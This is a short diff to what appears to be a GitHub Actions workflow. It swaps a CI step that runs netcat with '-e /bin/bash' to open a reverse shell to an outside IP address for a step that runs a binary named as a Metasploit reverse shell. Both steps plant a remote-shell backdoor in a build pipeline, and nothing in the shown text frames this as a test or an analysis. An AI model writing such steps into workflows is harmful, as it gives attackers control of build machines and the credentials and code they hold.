@@ -10,5 +10,5 @@ jobs:
  
     steps:
     - uses: actions/checkout@v1
-    - name: netcat reverse shell
-      run: nc 164.132.18.139 38989 –e /bin/bash
+    - name: metasploit reverse shell
+      run: ./reverse_shell.elf
